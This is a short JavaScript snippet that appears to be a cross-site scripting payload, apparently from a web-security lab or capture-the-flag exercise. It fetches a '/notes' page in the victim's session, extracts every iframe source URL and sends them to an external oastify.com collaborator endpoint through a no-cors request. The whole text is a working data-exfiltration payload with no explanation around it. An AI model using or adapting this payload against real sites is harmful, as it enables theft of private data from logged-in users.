fetch('/notes').then(r=>r.text()).then(d=>{
  // Parse the HTML response
  let doc = (new DOMParser()).parseFromString(d, 'text/html');
  
  // Extract all iframe src attributes
  let iframes = doc.querySelectorAll('iframe');
  let sources = Array.from(iframes).map(iframe => iframe.getAttribute('src')).join(',');
  
  // Send the collected sources to your endpoint
  fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(sources), {
    method: 'GET',
    mode: 'no-cors'
  });
})
